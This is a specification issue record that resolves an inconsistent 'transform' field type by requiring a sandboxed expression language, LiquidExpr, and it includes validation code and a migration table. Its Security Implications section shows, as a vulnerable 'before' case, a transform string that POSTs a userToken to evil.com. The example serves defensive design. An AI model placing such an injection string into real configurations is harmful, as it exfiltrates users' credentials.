# ISS-017: Signal Transform Type Conflict

**Issue Type:** Consistency Issue
**Severity:** High
**Status:** Resolved
**Date:** 2025-12-21

---

## Problem Statement

The type of the `transform` field in signal emission/reception interfaces is inconsistent between the conceptual description in §8.3 and the normative specification in B.2.4 and B.6.1.

### Location A: §8.3 (Conceptual, Line 654)

Context: Field binding definition

```typescript
interface FieldBinding {
  target: BindingSlot;               // Where data goes (x, y, value, label, etc.)
  field: string;                     // Source field name
  transform?: TransformSpec;         // Optional transformation
}
```

**Note:** This is actually in the binding context, but the issue references §8.3 and B.2.4 for signal transforms.

### Location B: §10.3 (Lines 784-795)

```typescript
interface SignalEmission {
  signal: string;             // Name from registry
  trigger: TriggerType;       // When to emit
  transform?: string;         // Value transformation
}

interface SignalReception {
  signal: string;             // Name from registry
  target: string;             // Binding path to update
  transform?: string;         // Value transformation
}
```

### Location C (Authoritative): B.4 and B.6.1

**B.4.5 (Lines 2161-2172) - LiquidExpr Examples:**

```typescript
// In binding specification
binding: {
  fields: [
    { target: 'value', field: 'revenue', transform: 'currency($revenue, "$")' },
    { target: 'label', field: 'name', transform: 'upper($name)' },
    { target: 'trend', field: 'change', transform: '$change >= 0 ? "up" : "down"' },
    { target: 'display', transform: 'concat($firstName, " ", $lastName)' },
  ]
}
```

**B.6.1 (Lines 2381-2386, 2407-2417) - Normative Types:**

```typescript
interface FieldBinding {
  target: BindingSlot;                   // Slot name (see §9.2)
  field: string;                         // Source field
  transform?: string;                    // LiquidExpr (see B.4)
}

interface SignalEmission {
  signal: string;
  trigger: string;
  transform?: string;                    // LiquidExpr
}

interface SignalReception {
  signal: string;
  target: string;
  transform?: string;                    // LiquidExpr
}
```

---

## Discrepancies Identified

1. **Type Ambiguity in §8.3 (FieldBinding):**
   - Uses `transform?: TransformSpec`
   - `TransformSpec` is never defined in the document
   - Creates ambiguity: is it a string? An object? A typed DSL?

2. **Conceptual vs Implementation Gap:**
   - §10.3 correctly uses `transform?: string`
   - But without context, readers don't know this string is a LiquidExpr (a constrained DSL)
   - Risk of implementers treating it as arbitrary JavaScript

3. **Missing Cross-Reference:**
   - §8.3 and §10.3 don't reference B.4 (Safe Transform DSL)
   - Implementers won't know the security/determinism requirements

---

## Root Cause Analysis

The confusion stems from **incomplete specification evolution**:

1. Early spec (§8.3) envisioned a typed `TransformSpec` object
2. Hardening process (Appendix B) introduced LiquidExpr as a string-based DSL
3. §8.3 was not updated to reflect this decision
4. §10.3 uses `string` but doesn't explain constraints

This is a classic case where **normative requirements were added late** without updating earlier pedagogical sections.

---

## Resolution

### Authoritative Source

**Appendix B.4** and **B.6.1** are normative:

> **B.4 Safe Transform DSL**
> **Problem:** Free-form `transform: string` in bindings is a security risk (injection), determinism risk (cross-platform differences), and complexity risk (unbounded).
> **Solution:** A tiny, total, sandboxed expression language.

The type is `string`, but the content MUST be a valid LiquidExpr.

### Required Changes

#### 1. Update §9.1 (Binding Definition) - Lines 638-656

**Current:**

```typescript
interface FieldBinding {
  target: BindingSlot;               // Where data goes (x, y, value, label, etc.)
  field: string;                     // Source field name
  transform?: TransformSpec;         // Optional transformation
}
```

**Replacement:**

```typescript
interface FieldBinding {
  target: BindingSlot;               // Where data goes (x, y, value, label, etc.)
  field: string;                     // Source field name
  transform?: string;                // Optional transformation (LiquidExpr, see B.4)
}
```

**Justification:** Aligns with B.6.1 normative definition. Adds cross-reference to B.4 for implementers.

#### 2. Add Documentation to §10.3 (Signal Connections) - After Line 795

**Add this note immediately after the `SignalReception` interface:**

```markdown
**Transform Expressions:**

The `transform` field in both `SignalEmission` and `SignalReception` MUST be a valid **LiquidExpr** (see B.4).

- **Type:** `string` (DSL expression, not arbitrary code)
- **Constraints:** Pure, total, sandboxed (no side effects, no I/O)
- **Purpose:** Transform signal values before emission or after reception
- **Security:** No eval, no external access (see B.4.6)

Examples:
```typescript
// Transform outbound signal value
emits: [{
  signal: 'dateRange',
  trigger: 'onChange',
  transform: 'format($startDate, "YYYY-MM-DD")'
}]

// Transform inbound signal value before binding
receives: [{
  signal: 'dateRange',
  target: 'filter.date',
  transform: '$value.start'
}]
```

For complete LiquidExpr specification, see **Appendix B.4**.
```

#### 3. Remove Undefined Type Reference

**Search for:** `TransformSpec`

**Result:** Should only appear in the old §9.1 definition (line 654). After applying change #1, this undefined type is eliminated.

---

## Validation

After applying these changes:

1. ✅ All `transform` fields are typed as `string` (consistent)
2. ✅ Cross-references to B.4 are present at all usage sites
3. ✅ Implementers understand this is LiquidExpr, not arbitrary code
4. ✅ Security properties (sandboxing) are discoverable
5. ✅ No undefined types remain (`TransformSpec` removed)

---

## Implementation Notes

### For Spec Editors

- This is a **clarification**, not a behavioral change
- The intent was always to use LiquidExpr; early spec just used wrong type name
- Consider adding a forward reference from §9.1 to B.4 for first-time readers

### For Implementers

**Critical Requirements:**

1. **Parse as LiquidExpr:** All `transform` strings MUST be parsed and validated using the LiquidExpr grammar (B.4.2)

2. **Reject Invalid Expressions:** Compilation MUST fail if transform is not valid LiquidExpr
   ```typescript
   // Example validation
   function validateTransform(expr: string): void {
     const ast = LiquidExprParser.parse(expr);
     if (!ast.isValid) {
       throw new CompileError(`Invalid transform: ${expr}`);
     }
   }
   ```

3. **Sandbox Execution:** Transform execution MUST use the sandboxed LiquidExpr runtime (B.4.6)
   - No access to `window`, `process`, `eval()`
   - Pure functions only
   - Bounded execution time (max 1000 operations)

4. **Error Handling:** Transforms MUST NOT throw (B.4.4)
   ```typescript
   // Transform errors produce null
   const result = executeLiquidExpr('10 / 0'); // Returns null, not exception
   ```

### Migration Guide

If you have existing implementations using free-form JavaScript transforms:

1. **Audit existing transforms** for security issues (eval, external access)
2. **Rewrite using LiquidExpr** built-in functions (B.4.3)
3. **Add validation** at compile time
4. **Test error handling** (ensure transforms never crash)

**Common Migrations:**

| Old (Unsafe) | New (LiquidExpr) |
|--------------|------------------|
| `value.toUpperCase()` | `upper($value)` |
| `Math.round(value)` | `round($value)` |
| `value * 100 + '%'` | `concat(round($value * 100), "%")` |
| `new Date(value).getFullYear()` | `year($value)` |

---

## Security Implications

This resolution has **critical security impact**:

### Before (Vulnerable)

```typescript
// Arbitrary code execution risk
transform: "(() => { fetch('evil.com', { method: 'POST', body: userToken }); return value; })()"
```

### After (Safe)

```typescript
// Only LiquidExpr allowed - no I/O, no external access
transform: "upper($value)"  // ✅ Valid
transform: "fetch(...)"     // ❌ Compilation error (function not in allowlist)
```

**Validation Example:**

```typescript
// Schema validation must check transform syntax
const SignalEmissionSchema = z.object({
  signal: z.string(),
  trigger: z.string(),
  transform: z.string()
    .optional()
    .refine(
      (expr) => expr === undefined || LiquidExprParser.isValid(expr),
      { message: "Transform must be valid LiquidExpr" }
    ),
});
```

---

## Related Issues

- ISS-016: Block Interface Definition Mismatch (also addresses type consistency)
- **Future:** Consider adding a compile-time transform validator to the schema pipeline

---

## Checklist

- [x] Discrepancies identified
- [x] Authoritative source determined (B.4, B.6.1)
- [x] Non-authoritative locations identified (§9.1, §10.3)
- [x] Specific changes documented
- [x] Security implications analyzed
- [x] Migration guide provided
- [x] Validation criteria defined

---

**Resolution Authority:** Appendix B.4 (Safe Transform DSL) and B.6.1 (Normative Types)
**Change Scope:** Non-breaking (clarification of existing intent)
**Security Impact:** Critical (prevents code injection)
**Priority:** Must fix before v2.0 publication
